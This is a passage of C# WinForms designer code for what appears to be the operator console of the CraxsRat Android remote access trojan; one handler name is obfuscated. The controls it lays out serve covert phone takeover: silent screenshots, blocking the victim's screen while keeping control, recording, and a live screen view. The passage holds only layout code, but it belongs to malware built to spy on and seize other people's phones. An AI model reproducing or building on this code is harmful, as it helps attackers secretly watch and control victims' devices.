            this.DrakeUIAvatar2.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar2.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar2.Location = new System.Drawing.Point(396, 8);
            this.DrakeUIAvatar2.Name = "DrakeUIAvatar2";
            this.DrakeUIAvatar2.Size = new System.Drawing.Size(52, 35);
            this.DrakeUIAvatar2.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar2.Symbol = 61912;
            this.DrakeUIAvatar2.SymbolSize = 25;
            this.DrakeUIAvatar2.TabIndex = 45;
            this.DrakeUIAvatar2.Text = "DrakeUIAvatar2";
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar2, "Send");
            this.DrakeUIAvatar2.Click += new System.EventHandler(this.DrakeUIAvatar2_Click);
            // 
            // Panel6
            // 
            this.Panel6.BackColor = System.Drawing.Color.Transparent;
            this.Panel6.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
            this.Panel6.Controls.Add(this.Panel1);
            this.Panel6.Controls.Add(this.Panel4);
            this.Panel6.Controls.Add(this.Panel3);
            this.Panel6.Controls.Add(this.Panel5);
            this.Panel6.Controls.Add(this.Panel2);
            this.Panel6.Location = new System.Drawing.Point(56, 295);
            this.Panel6.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Panel6.Name = "Panel6";
            this.Panel6.Size = new System.Drawing.Size(104, 82);
            this.Panel6.TabIndex = 2;
            // 
            // Panel7
            // 
            this.Panel7.BackColor = System.Drawing.Color.Black;
            this.Panel7.Controls.Add(this.PictureBox1);
            this.Panel7.Controls.Add(this.DrakeUIAvatar7);
            this.Panel7.Controls.Add(this.combosize);
            this.Panel7.Controls.Add(this.Label7);
            this.Panel7.Controls.Add(this.Label6);
            this.Panel7.Controls.Add(this.Label1);
            this.Panel7.Controls.Add(this.Label5);
            this.Panel7.Controls.Add(this.Label2);
            this.Panel7.Controls.Add(this.Label4);
            this.Panel7.Controls.Add(this.Dismisbtn);
            this.Panel7.Controls.Add(this.SKtype);
            this.Panel7.Controls.Add(this.scshotbtn);
            this.Panel7.Controls.Add(this.StopButton);
            this.Panel7.Controls.Add(this.Panel9);
            this.Panel7.Controls.Add(this.DrakeUIAvatar4);
            this.Panel7.Controls.Add(this.DrakeUIAvatar3);
            this.Panel7.Location = new System.Drawing.Point(74, 378);
            this.Panel7.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.Panel7.Name = "Panel7";
            this.Panel7.Size = new System.Drawing.Size(48, 54);
            this.Panel7.TabIndex = 2;
            // 
            // DrakeUIAvatar7
            // 
            this.DrakeUIAvatar7.AvatarSize = 45;
            this.DrakeUIAvatar7.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar7.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.DrakeUIAvatar7.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar7.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar7.Location = new System.Drawing.Point(0, -108);
            this.DrakeUIAvatar7.Name = "DrakeUIAvatar7";
            this.DrakeUIAvatar7.Size = new System.Drawing.Size(48, 54);
            this.DrakeUIAvatar7.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar7.Symbol = 61641;
            this.DrakeUIAvatar7.SymbolSize = 25;
            this.DrakeUIAvatar7.TabIndex = 37;
            this.DrakeUIAvatar7.Text = "DrakeUIAvatar7";
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar7, "Recent");
            this.DrakeUIAvatar7.Click += new System.EventHandler(this.DrakeUIAvatar7_Click);
            // 
            // combosize
            // 
            this.combosize.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.combosize.FillColor = System.Drawing.Color.Black;
            this.combosize.Font = new System.Drawing.Font("Calibri", 9F);
            this.combosize.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(177)))), ((int)(((byte)(225)))));
            this.combosize.Location = new System.Drawing.Point(0, 676);
            this.combosize.Margin = new System.Windows.Forms.Padding(6, 7, 6, 7);
            this.combosize.MinimumSize = new System.Drawing.Size(94, 0);
            this.combosize.Name = "combosize";
            this.combosize.Padding = new System.Windows.Forms.Padding(0, 0, 45, 0);
            this.combosize.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.combosize.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.combosize.Size = new System.Drawing.Size(112, 29);
            this.combosize.Style = DrakeUI.Framework.UIStyle.Custom;
            this.combosize.StyleCustomMode = true;
            this.combosize.TabIndex = 26;
            this.combosize.Text = "Auto";
            this.combosize.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // Label7
            // 
            this.Label7.Font = new System.Drawing.Font("Calibri", 10F);
            this.Label7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Label7.Location = new System.Drawing.Point(0, 652);
            this.Label7.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Label7.Name = "Label7";
            this.Label7.Size = new System.Drawing.Size(112, 24);
            this.Label7.TabIndex = 25;
            this.Label7.Text = "Size(px)";
            this.Label7.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // Label6
            // 
            this.Label6.Dock = System.Windows.Forms.DockStyle.Top;
            this.Label6.Font = new System.Drawing.Font("Calibri", 10F);
            this.Label6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Label6.Location = new System.Drawing.Point(0, 30);
            this.Label6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Label6.Name = "Label6";
            this.Label6.Size = new System.Drawing.Size(48, 17);
            this.Label6.TabIndex = 23;
            this.Label6.Text = "\r\n\r\n\r\n";
            this.Label6.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // Label5
            // 
            this.Label5.Dock = System.Windows.Forms.DockStyle.Top;
            this.Label5.Font = new System.Drawing.Font("Calibri", 10F);
            this.Label5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Label5.Location = new System.Drawing.Point(0, 11);
            this.Label5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Label5.Name = "Label5";
            this.Label5.Size = new System.Drawing.Size(48, 19);
            this.Label5.TabIndex = 22;
            this.Label5.Text = "\r\n\r\n\r\n";
            this.Label5.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // Label4
            // 
            this.Label4.Dock = System.Windows.Forms.DockStyle.Top;
            this.Label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Bold);
            this.Label4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Label4.Location = new System.Drawing.Point(0, 0);
            this.Label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Label4.Name = "Label4";
            this.Label4.Size = new System.Drawing.Size(48, 11);
            this.Label4.TabIndex = 21;
            this.Label4.Text = "\r\n\r\n\r\n";
            this.Label4.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // Dismisbtn
            // 
            this.Dismisbtn.AvatarSize = 45;
            this.Dismisbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Dismisbtn.FillColor = System.Drawing.Color.Transparent;
            this.Dismisbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.Dismisbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Dismisbtn.Location = new System.Drawing.Point(0, 443);
            this.Dismisbtn.Name = "Dismisbtn";
            this.Dismisbtn.Size = new System.Drawing.Size(112, 54);
            this.Dismisbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.Dismisbtn.Symbol = 61473;
            this.Dismisbtn.SymbolSize = 25;
            this.Dismisbtn.TabIndex = 29;
            this.Dismisbtn.Text = "DrakeUIAvatar3";
            this.DrakeUIToolTip1.SetToolTip(this.Dismisbtn, "Dismiss Screenshot");
            this.Dismisbtn.Visible = false;
            this.Dismisbtn.Click += new System.EventHandler(this.Dismisbtn_Click);
            // 
            // SKtype
            // 
            this.SKtype.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.SKtype.FillColor = System.Drawing.Color.Black;
            this.SKtype.Font = new System.Drawing.Font("Calibri", 9F);
            this.SKtype.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(177)))), ((int)(((byte)(225)))));
            this.SKtype.Items.AddRange(new object[] {
            "Slient",
            "Normal"});
            this.SKtype.Location = new System.Drawing.Point(0, 413);
            this.SKtype.Margin = new System.Windows.Forms.Padding(6, 7, 6, 7);
            this.SKtype.MinimumSize = new System.Drawing.Size(94, 0);
            this.SKtype.Name = "SKtype";
            this.SKtype.Padding = new System.Windows.Forms.Padding(0, 0, 45, 0);
            this.SKtype.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.SKtype.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.SKtype.Size = new System.Drawing.Size(112, 29);
            this.SKtype.Style = DrakeUI.Framework.UIStyle.Custom;
            this.SKtype.StyleCustomMode = true;
            this.SKtype.TabIndex = 28;
            this.SKtype.Text = "Slient";
            this.SKtype.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // scshotbtn
            // 
            this.scshotbtn.AvatarSize = 45;
            this.scshotbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.scshotbtn.FillColor = System.Drawing.Color.Transparent;
            this.scshotbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.scshotbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.scshotbtn.Location = new System.Drawing.Point(0, 359);
            this.scshotbtn.Name = "scshotbtn";
            this.scshotbtn.Size = new System.Drawing.Size(112, 54);
            this.scshotbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.scshotbtn.Symbol = 62024;
            this.scshotbtn.TabIndex = 3;
            this.scshotbtn.Text = "DrakeUIAvatar2";
            this.DrakeUIToolTip1.SetToolTip(this.scshotbtn, "Phone Screen Shot");
            this.scshotbtn.Click += new System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatszxsxaj);
            // 
            // StopButton
            // 
            this.StopButton.AvatarSize = 45;
            this.StopButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.StopButton.FillColor = System.Drawing.Color.Transparent;
            this.StopButton.Font = new System.Drawing.Font("Calibri", 12F);
            this.StopButton.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.StopButton.Icon = DrakeUI.Framework.DrakeUIAvatar.UIIcon.Text;
            this.StopButton.Location = new System.Drawing.Point(0, 86);
            this.StopButton.Name = "StopButton";
            this.StopButton.Size = new System.Drawing.Size(112, 54);
            this.StopButton.Style = DrakeUI.Framework.UIStyle.Custom;
            this.StopButton.Symbol = 61526;
            this.StopButton.SymbolSize = 25;
            this.StopButton.TabIndex = 33;
            this.StopButton.Text = "Stop";
            this.DrakeUIToolTip1.SetToolTip(this.StopButton, "Stop");
            this.StopButton.Click += new System.EventHandler(this.StopButton_Click);
            // 
            // Panel9
            // 
            this.Panel9.BackColor = System.Drawing.Color.Black;
            this.Panel9.Controls.Add(this.DrakeUIAvatar5);
            this.Panel9.Controls.Add(this.DrakeUIAvatar6);
            this.Panel9.Location = new System.Drawing.Point(0, 0);
            this.Panel9.Name = "Panel9";
            this.Panel9.Size = new System.Drawing.Size(112, 32);
            this.Panel9.TabIndex = 34;
            // 
            // DrakeUIAvatar5
            // 
            this.DrakeUIAvatar5.AvatarSize = 15;
            this.DrakeUIAvatar5.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar5.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar5.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar5.Location = new System.Drawing.Point(38, 0);
            this.DrakeUIAvatar5.Name = "DrakeUIAvatar5";
            this.DrakeUIAvatar5.Size = new System.Drawing.Size(38, 32);
            this.DrakeUIAvatar5.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar5.Symbol = 61544;
            this.DrakeUIAvatar5.SymbolSize = 20;
            this.DrakeUIAvatar5.TabIndex = 30;
            this.DrakeUIAvatar5.Text = "DrakeUIAvatar3";
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar5, "Minimize");
            this.DrakeUIAvatar5.Click += new System.EventHandler(this.DrakeUIAvatar5_Click);
            // 
            // DrakeUIAvatar6
            // 
            this.DrakeUIAvatar6.AvatarSize = 15;
            this.DrakeUIAvatar6.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar6.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar6.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar6.Location = new System.Drawing.Point(75, 0);
            this.DrakeUIAvatar6.Name = "DrakeUIAvatar6";
            this.DrakeUIAvatar6.Size = new System.Drawing.Size(38, 32);
            this.DrakeUIAvatar6.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar6.Symbol = 61453;
            this.DrakeUIAvatar6.SymbolSize = 20;
            this.DrakeUIAvatar6.TabIndex = 31;
            this.DrakeUIAvatar6.Text = "DrakeUIAvatar3";
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar6, "Exit");
            this.DrakeUIAvatar6.Click += new System.EventHandler(this.DrakeUIAvatar6_Click);
            // 
            // DrakeUIAvatar4
            // 
            this.DrakeUIAvatar4.AvatarSize = 45;
            this.DrakeUIAvatar4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar4.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.DrakeUIAvatar4.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar4.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar4.Location = new System.Drawing.Point(0, -54);
            this.DrakeUIAvatar4.Name = "DrakeUIAvatar4";
            this.DrakeUIAvatar4.Size = new System.Drawing.Size(48, 54);
            this.DrakeUIAvatar4.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar4.Symbol = 61713;
            this.DrakeUIAvatar4.SymbolSize = 25;
            this.DrakeUIAvatar4.TabIndex = 36;
            this.DrakeUIAvatar4.Text = "DrakeUIAvatar4";
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar4, "Home");
            this.DrakeUIAvatar4.Click += new System.EventHandler(this.DrakeUIAvatar4_Click);
            // 
            // DrakeUIAvatar3
            // 
            this.DrakeUIAvatar3.AvatarSize = 45;
            this.DrakeUIAvatar3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar3.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.DrakeUIAvatar3.FillColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar3.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIAvatar3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar3.Location = new System.Drawing.Point(0, 0);
            this.DrakeUIAvatar3.Name = "DrakeUIAvatar3";
            this.DrakeUIAvatar3.Size = new System.Drawing.Size(48, 54);
            this.DrakeUIAvatar3.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar3.Symbol = 61540;
            this.DrakeUIAvatar3.SymbolSize = 25;
            this.DrakeUIAvatar3.TabIndex = 35;
            this.DrakeUIAvatar3.Text = "DrakeUIAvatar3";
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar3, "Back");
            this.DrakeUIAvatar3.Click += new System.EventHandler(this.DrakeUIAvatar3_Click_1);
            // 
            // FPSBOX
            // 
            this.FPSBOX.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.FPSBOX.FillColor = System.Drawing.Color.Black;
            this.FPSBOX.Font = new System.Drawing.Font("Calibri", 9F);
            this.FPSBOX.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(177)))), ((int)(((byte)(225)))));
            this.FPSBOX.Location = new System.Drawing.Point(30, 508);
            this.FPSBOX.Margin = new System.Windows.Forms.Padding(6, 7, 6, 7);
            this.FPSBOX.MinimumSize = new System.Drawing.Size(94, 0);
            this.FPSBOX.Name = "FPSBOX";
            this.FPSBOX.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
            this.FPSBOX.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.FPSBOX.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.FPSBOX.Size = new System.Drawing.Size(94, 29);
            this.FPSBOX.Style = DrakeUI.Framework.UIStyle.Custom;
            this.FPSBOX.StyleCustomMode = true;
            this.FPSBOX.TabIndex = 27;
            this.FPSBOX.Text = "2";
            this.FPSBOX.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // chkctrl
            // 
            this.chkctrl.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.chkctrl.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkctrl.Enabled = false;
            this.chkctrl.Font = new System.Drawing.Font("Calibri", 10F);
            this.chkctrl.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.chkctrl.Location = new System.Drawing.Point(23, 234);
            this.chkctrl.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.chkctrl.Name = "chkctrl";
            this.chkctrl.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
            this.chkctrl.Size = new System.Drawing.Size(27, 37);
            this.chkctrl.Style = DrakeUI.Framework.UIStyle.Custom;
            this.chkctrl.StyleCustomMode = true;
            this.chkctrl.TabIndex = 31;
            this.chkctrl.TextAlign = System.Drawing.ContentAlignment.TopLeft;
            this.DrakeUIToolTip1.SetToolTip(this.chkctrl, "Allow Screen Control While blocked");
            this.chkctrl.MouseClick += new System.Windows.Forms.MouseEventHandler(this.Chkctrl_MouseClick);
            // 
            // Qualtibox
            // 
            this.Qualtibox.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.Qualtibox.FillColor = System.Drawing.Color.Black;
            this.Qualtibox.Font = new System.Drawing.Font("Calibri", 9F);
            this.Qualtibox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(177)))), ((int)(((byte)(225)))));
            this.Qualtibox.Items.AddRange(new object[] {
            "10",
            "20",
            "30",
            "40",
            "50",
            "60",
            "70",
            "80",
            "90",
            "100"});
            this.Qualtibox.Location = new System.Drawing.Point(30, 601);
            this.Qualtibox.Margin = new System.Windows.Forms.Padding(6, 7, 6, 7);
            this.Qualtibox.MinimumSize = new System.Drawing.Size(94, 0);
            this.Qualtibox.Name = "Qualtibox";
            this.Qualtibox.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
            this.Qualtibox.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Qualtibox.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.Qualtibox.Size = new System.Drawing.Size(94, 29);
            this.Qualtibox.Style = DrakeUI.Framework.UIStyle.Custom;
            this.Qualtibox.StyleCustomMode = true;
            this.Qualtibox.TabIndex = 28;
            this.Qualtibox.Text = "50";
            this.Qualtibox.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // DrakeUIToolTip1
            // 
            this.DrakeUIToolTip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(54)))), ((int)(((byte)(54)))));
            this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(239)))), ((int)(((byte)(239)))));
            this.DrakeUIToolTip1.OwnerDraw = true;
            // 
            // Timer1
            // 
            this.Timer1.Interval = 1;
            this.Timer1.Tick += new System.EventHandler(this.Timer1_Tick);
            // 
            // refreshtimer
            // 
            this.refreshtimer.Interval = 1;
            this.refreshtimer.Tick += new System.EventHandler(this.Refreshtimer_Tick);
            // 
            // presstimer
            // 
            this.presstimer.Interval = 1000;
            this.presstimer.Tick += new System.EventHandler(this.Presstimer_Tick);
            // 
            // toolTip1
            // 
            this.toolTip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(54)))), ((int)(((byte)(54)))));
            this.toolTip1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(239)))), ((int)(((byte)(239)))));
            this.toolTip1.OwnerDraw = true;
            // 
            // timer2
            // 
            this.timer2.Interval = 1000;
            // 
            // timer3
            // 
            this.timer3.Interval = 500;
            // 
            // toolTip2
            // 
            this.toolTip2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(54)))), ((int)(((byte)(54)))));
            this.toolTip2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(239)))), ((int)(((byte)(239)))), ((int)(((byte)(239)))));
            this.toolTip2.OwnerDraw = true;
            // 
            // timer7
            // 
            this.timer7.Interval = 1000;
            // 
            // timer8
            // 
            this.timer8.Interval = 500;
            // 
            // checkblock
            // 
            this.checkblock.AutoSize = true;
            this.checkblock.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkblock.Location = new System.Drawing.Point(919, 196);
            this.checkblock.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.checkblock.MinimumSize = new System.Drawing.Size(68, 30);
            this.checkblock.Name = "checkblock";
            this.checkblock.OffBackColor = System.Drawing.Color.Gray;
            this.checkblock.OffToggleColor = System.Drawing.Color.Gainsboro;
            this.checkblock.OnBackColor = System.Drawing.Color.Lime;
            this.checkblock.OnToggleColor = System.Drawing.Color.WhiteSmoke;
            this.checkblock.Size = new System.Drawing.Size(68, 30);
            this.checkblock.TabIndex = 0;
            this.checkblock.UseVisualStyleBackColor = true;
            this.checkblock.MouseClick += new System.Windows.Forms.MouseEventHandler(this.Checkblock_MouseClick);
            // 
            // SPanel3
            // 
            this.SPanel3.BackColor = System.Drawing.Color.Black;
            this.SPanel3.BorderColor = System.Drawing.Color.Black;
            this.SPanel3.BorderRadius = 6;
            this.SPanel3.BorderSize = 2;
            this.SPanel3.Controls.Add(this.pictureBox13);
            this.SPanel3.Controls.Add(this.pictureBox17);
            this.SPanel3.Controls.Add(this.pictureBox12);
            this.SPanel3.Controls.Add(this.pictureBox16);
            this.SPanel3.Controls.Add(this.drakeUIComboBox1);
            this.SPanel3.Controls.Add(this.label8);
            this.SPanel3.Controls.Add(this.drakeUICheckBox1);
            this.SPanel3.Controls.Add(this.label9);
            this.SPanel3.Controls.Add(this.label3);
            this.SPanel3.Controls.Add(this.drakeUILabel5);
            this.SPanel3.Controls.Add(this.drakeUILabel6);
            this.SPanel3.Controls.Add(this.PictureBox9);
            this.SPanel3.Controls.Add(this.Guna2Button5);
            this.SPanel3.Controls.Add(this.Save);
            this.SPanel3.Controls.Add(this.Qualtibox);
            this.SPanel3.Controls.Add(this.DrakeUILabel3);
            this.SPanel3.Controls.Add(this.chkctrl);
            this.SPanel3.Controls.Add(this.DrakeUILabel2);
            this.SPanel3.Controls.Add(this.PictureBox11);
            this.SPanel3.Controls.Add(this.FPSBOX);
            this.SPanel3.ForeColor = System.Drawing.Color.White;
            this.SPanel3.Location = new System.Drawing.Point(542, 17);
            this.SPanel3.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.SPanel3.Name = "SPanel3";
            this.SPanel3.Size = new System.Drawing.Size(153, 944);
            this.SPanel3.TabIndex = 80;
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Bahnschrift SemiBold", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label9.ForeColor = System.Drawing.Color.Red;
            this.label9.Location = new System.Drawing.Point(54, 159);
            this.label9.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(80, 22);
            this.label9.TabIndex = 103;
            this.label9.Text = "RECORD";
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Bahnschrift SemiBold", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label8.ForeColor = System.Drawing.Color.Red;
            this.label8.Location = new System.Drawing.Point(54, 479);
            this.label8.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(42, 22);
            this.label8.TabIndex = 102;
            this.label8.Text = "FPS";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Bahnschrift SemiBold", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.Color.Red;
            this.label3.Location = new System.Drawing.Point(38, 572);
            this.label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(80, 22);
            this.label3.TabIndex = 101;
            this.label3.Text = "QUALITY";
            // 
            // DrakeUILabel2
            // 
            this.DrakeUILabel2.Font = new System.Drawing.Font("Bahnschrift", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DrakeUILabel2.ForeColor = System.Drawing.Color.Red;
            this.DrakeUILabel2.Location = new System.Drawing.Point(49, 304);
            this.DrakeUILabel2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.DrakeUILabel2.Name = "DrakeUILabel2";
            this.DrakeUILabel2.Size = new System.Drawing.Size(92, 26);
            this.DrakeUILabel2.TabIndex = 100;
            this.DrakeUILabel2.Text = "Control";
            this.DrakeUILabel2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // DrakeUILabel3
            // 
            this.DrakeUILabel3.Font = new System.Drawing.Font("Bahnschrift", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DrakeUILabel3.ForeColor = System.Drawing.Color.Red;
            this.DrakeUILabel3.Location = new System.Drawing.Point(53, 234);
            this.DrakeUILabel3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.DrakeUILabel3.Name = "DrakeUILabel3";
            this.DrakeUILabel3.Size = new System.Drawing.Size(80, 39);
            this.DrakeUILabel3.TabIndex = 99;
            this.DrakeUILabel3.Text = "Block";
            this.DrakeUILabel3.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // panel10
            // 
            this.panel10.BackColor = System.Drawing.Color.Black;
            this.panel10.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.panel10.Location = new System.Drawing.Point(5, 9);
            this.panel10.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.panel10.Name = "panel10";
            this.panel10.Size = new System.Drawing.Size(432, 821);
            this.panel10.TabIndex = 2;
            // 
            // SPanel1
            // 
            this.SPanel1.BackColor = System.Drawing.Color.Black;
            this.SPanel1.BorderColor = System.Drawing.Color.Black;
            this.SPanel1.BorderRadius = 15;
            this.SPanel1.BorderSize = 2;
            this.SPanel1.Controls.Add(this.pictureBox18);
            this.SPanel1.Controls.Add(this.PictureBox14);
            this.SPanel1.Controls.Add(this.pictureBox8);
            this.SPanel1.Controls.Add(this.PictureBox10);
            this.SPanel1.Controls.Add(this.drakeUILabel4);
            this.SPanel1.Controls.Add(this.Panel8);
            this.SPanel1.Controls.Add(this.toptitle);
            this.SPanel1.Controls.Add(this.Livepicbox);
